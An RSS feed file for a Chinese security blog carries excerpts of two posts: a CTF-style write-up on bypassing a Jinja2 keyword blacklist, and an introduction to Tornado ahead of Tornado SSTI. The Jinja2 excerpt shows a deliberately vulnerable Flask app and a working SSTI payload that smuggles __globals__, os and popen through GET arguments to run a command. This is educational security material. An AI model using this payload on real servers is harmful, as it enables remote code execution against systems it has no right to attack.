@@ -1,0 +1,104 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Python安全 on S0lowalker</title><link>https://s0lowalker.github.io/categories/python%E5%AE%89%E5%85%A8/</link><description>Recent content in Python安全 on S0lowalker</description><generator>Hugo</generator><language>zh-cn</language><lastBuildDate>Sat, 11 Apr 2026 00:00:00 +0000</lastBuildDate><atom:link href="https://s0lowalker.github.io/categories/python%E5%AE%89%E5%85%A8/index.xml" rel="self" type="application/rss+xml"/><item><title>Jinja2常见关键字被ban后的SSTI</title><link>https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/</link><pubDate>Sat, 11 Apr 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/ssti/jinja2%E6%A8%A1%E6%9D%BF%E4%B8%8B%E9%9D%9E%E5%B8%B8%E8%A7%81%E7%9A%84ssti/</guid><description>&lt;h1 id="jinja2常见关键字被ban后的ssti"&gt;
+ Jinja2常见关键字被ban后的SSTI
+ &lt;a class="anchor" href="#jinja2%e5%b8%b8%e8%a7%81%e5%85%b3%e9%94%ae%e5%ad%97%e8%a2%abban%e5%90%8e%e7%9a%84ssti"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="题目源码"&gt;
+ 题目源码
+ &lt;a class="anchor" href="#%e9%a2%98%e7%9b%ae%e6%ba%90%e7%a0%81"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask &lt;span style="color:#f92672"&gt;import&lt;/span&gt; Flask,render_template_string,request,render_template
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;app&lt;span style="color:#f92672"&gt;=&lt;/span&gt;Flask(__name__)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/&amp;#39;&lt;/span&gt;,methods&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;])
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;index&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	black_list&lt;span style="color:#f92672"&gt;=&lt;/span&gt;[&lt;span style="color:#e6db74"&gt;&amp;#39;__class__&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;__init__&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;7&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;*&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;import&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;os&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;popen&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;__&amp;#39;&lt;/span&gt;,&lt;span style="color:#e6db74"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;]
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;method&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		name&lt;span style="color:#f92672"&gt;=&lt;/span&gt;request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;form&lt;span style="color:#f92672"&gt;.&lt;/span&gt;get(&lt;span style="color:#e6db74"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;for&lt;/span&gt; black &lt;span style="color:#f92672"&gt;in&lt;/span&gt; black_list:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;			&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; black &lt;span style="color:#f92672"&gt;in&lt;/span&gt; name:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;				&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;waf!&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		result&lt;span style="color:#f92672"&gt;=&lt;/span&gt;render_template_string(name)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;		&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;ok&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	&lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; render_template(&lt;span style="color:#e6db74"&gt;&amp;#39;index.html&amp;#39;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__&lt;span style="color:#f92672"&gt;==&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;	app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;run(host&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;0.0.0.0&amp;#39;&lt;/span&gt;,port&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#ae81ff"&gt;5000&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;题目给的源码很简单，只是给了一个黑名单，把常见的SSTI所用的关键字给ban了，但是这里只检查POST请求体name参数是否有非法字符，如果我们把这些敏感字符放在GET参数里面，然后在POST请求体里面用&lt;code&gt;request.args&lt;/code&gt;获取GET参数即可绕过。&lt;/p&gt;
+&lt;h2 id="payload"&gt;
+ payload
+ &lt;a class="anchor" href="#payload"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;POST: {{(((lipsum&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;g))&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;gi)(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;o))&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;p)(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;c))&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;r)()}}
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;GET: g&lt;span style="color:#f92672"&gt;=&lt;/span&gt;__globals__&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;gi&lt;span style="color:#f92672"&gt;=&lt;/span&gt;&lt;span style="color:#a6e22e"&gt;__getitem__&lt;/span&gt;&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;o&lt;span style="color:#f92672"&gt;=&lt;/span&gt;os&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;p&lt;span style="color:#f92672"&gt;=&lt;/span&gt;popen&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;c&lt;span style="color:#f92672"&gt;=&lt;/span&gt;命令&lt;span style="color:#f92672"&gt;&amp;amp;&lt;/span&gt;r&lt;span style="color:#f92672"&gt;=&lt;/span&gt;read
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id="payload讲解"&gt;
+ payload讲解
+ &lt;a class="anchor" href="#payload%e8%ae%b2%e8%a7%a3"&gt;#&lt;/a&gt;
+&lt;/h3&gt;
+&lt;p&gt;&lt;code&gt;lipsum&lt;/code&gt;：Jinja2内置的全局函数，是一个python函数对象。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;|attr(...)&lt;/code&gt;：Jinja2的过滤器，作用相当于&lt;code&gt;getattr(object, attribute_name)&lt;/code&gt;，用来获取对象的属性或方法名。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;request.args.xxx&lt;/code&gt;：从GET参数中取值。&lt;/p&gt;
+&lt;h4 id="第一步获取lipsum的__globals__"&gt;
+ 第一步：获取&lt;code&gt;lipsum&lt;/code&gt;的&lt;code&gt;__globals__&lt;/code&gt;
+ &lt;a class="anchor" href="#%e7%ac%ac%e4%b8%80%e6%ad%a5%e8%8e%b7%e5%8f%96lipsum%e7%9a%84__globals__"&gt;#&lt;/a&gt;
+&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;lipsum&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;g)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="基本语法"&gt;
+ 基本语法
+ &lt;a class="anchor" href="#%e5%9f%ba%e6%9c%ac%e8%af%ad%e6%b3%95"&gt;#&lt;/a&gt;
+&lt;/h5&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;{{ object&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(&lt;span style="color:#e6db74"&gt;&amp;#34;attribute_name&amp;#34;&lt;/span&gt;) }}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在jinja2模板中，通常使用&lt;code&gt;.&lt;/code&gt;来访问属性，但有局限性：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;不能使用变量作为属性名&lt;/li&gt;
+&lt;li&gt;不能访问名称中包含特殊字符的属性&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;这样我们就能获取到&lt;code&gt;lipsum&lt;/code&gt;函数对象的g属性(g是我们可以控制的，由GET参数决定)。如果我们在GET参数中带上&lt;code&gt;?g=__globals__&lt;/code&gt;，我们就能获取&lt;code&gt;lipsum.__globals__&lt;/code&gt;这个字典。&lt;/p&gt;
+&lt;h4 id="第二步从__globals__中获取某个成员"&gt;
+ 第二步：从&lt;code&gt;__globals__&lt;/code&gt;中获取某个成员
+ &lt;a class="anchor" href="#%e7%ac%ac%e4%ba%8c%e6%ad%a5%e4%bb%8e__globals__%e4%b8%ad%e8%8e%b7%e5%8f%96%e6%9f%90%e4%b8%aa%e6%88%90%e5%91%98"&gt;#&lt;/a&gt;
+&lt;/h4&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;(lipsum&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;g))&lt;span style="color:#f92672"&gt;|&lt;/span&gt;attr(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;gi)(request&lt;span style="color:#f92672"&gt;.&lt;/span&gt;args&lt;span style="color:#f92672"&gt;.&lt;/span&gt;o)
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h5 id="语法分解"&gt;
+ 语法分解
+ &lt;a class="anchor" href="#%e8%af%ad%e6%b3%95%e5%88%86%e8%a7%a3"&gt;#&lt;/a&gt;
+&lt;/h5&gt;
+&lt;p&gt;第一部分：&lt;code&gt;|attr(request.args.gi)&lt;/code&gt;&lt;/p&gt;</description></item><item><title>SSTI之Tornado</title><link>https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/</link><pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate><guid>https://s0lowalker.github.io/docs/web%E5%AE%89%E5%85%A8/ssti/tornado%E6%A8%A1%E6%9D%BF%E4%B8%8B%E7%9A%84ssti/</guid><description>&lt;h1 id="tornado与ssti"&gt;
+ Tornado与SSTI
+ &lt;a class="anchor" href="#tornado%e4%b8%8essti"&gt;#&lt;/a&gt;
+&lt;/h1&gt;
+&lt;h2 id="关于tornado"&gt;
+ 关于Tornado
+ &lt;a class="anchor" href="#%e5%85%b3%e4%ba%8etornado"&gt;#&lt;/a&gt;
+&lt;/h2&gt;
+&lt;h3 id="tornado简介"&gt;
+ Tornado简介
+ &lt;a class="anchor" href="#tornado%e7%ae%80%e4%bb%8b"&gt;#&lt;/a&gt;
+&lt;/h3&gt;
+&lt;p&gt;Tornado 是一个 Python Web 框架和异步网络库，既能快速搭建网站，也能处理底层网络通信。通过使用非阻塞网络 I/O，Tornado 可以扩展到数万个开放连接，使其成为长轮询、WebSocket 和其他需要与每个用户保持长期连接的应用程序的理想选择。&lt;/p&gt;
+&lt;p&gt;Tornado 可以粗略地分为三个主要部分：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;一个 Web 框架（包括 RequestHandler，它被子类化以创建 Web 应用程序，以及各种支持类）。简单来说，就是我们不能直接使用Tornado的原始的&lt;code&gt;RequestHandler&lt;/code&gt;这个类，而要自己创建一个类继承它。一个这样的web应用，本质上就是由很多这样继承了&lt;code&gt;RequestHandler&lt;/code&gt;的类组成的。这里给一个简单的源码。&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; asyncio
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; tornado
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;class&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;MainHandler&lt;/span&gt;(tornado&lt;span style="color:#f92672"&gt;.&lt;/span&gt;web&lt;span style="color:#f92672"&gt;.&lt;/span&gt;RequestHandler):
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;get&lt;/span&gt;(self):
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; self&lt;span style="color:#f92672"&gt;.&lt;/span&gt;write(&lt;span style="color:#e6db74"&gt;&amp;#34;Hello, world&amp;#34;&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;make_app&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; tornado&lt;span style="color:#f92672"&gt;.&lt;/span&gt;web&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Application([
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; (&lt;span style="color:#e6db74"&gt;r&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#34;/&amp;#34;&lt;/span&gt;, MainHandler),
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; ])
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;async&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;main&lt;/span&gt;():
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app &lt;span style="color:#f92672"&gt;=&lt;/span&gt; make_app()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; app&lt;span style="color:#f92672"&gt;.&lt;/span&gt;listen(&lt;span style="color:#ae81ff"&gt;8888&lt;/span&gt;)
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;await&lt;/span&gt; asyncio&lt;span style="color:#f92672"&gt;.&lt;/span&gt;Event()&lt;span style="color:#f92672"&gt;.&lt;/span&gt;wait()
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#34;__main__&amp;#34;&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; asyncio&lt;span style="color:#f92672"&gt;.&lt;/span&gt;run(main())
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;HTTP 的客户端和服务器端实现 (HTTPServer 和 AsyncHTTPClient）。简单来说，Tornado既可以是客户端，也可以是服务器端。Tornado内置了一个由python编写的高性能HTTP服务器(叫HTTPServer)，不需要依赖Apache、Nginx之类的web server，所以可以作为服务器端。Tornado可以作为客户端，是因为有AsyncHTTPClient，它可以用来访问其他网站或者API。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;一个异步网络库，包括类 IOLoop 和 IOStream，它们作为 HTTP 组件的构建块，也可以用于实现其他协议。&lt;/p&gt;</description></item></channel></rss>
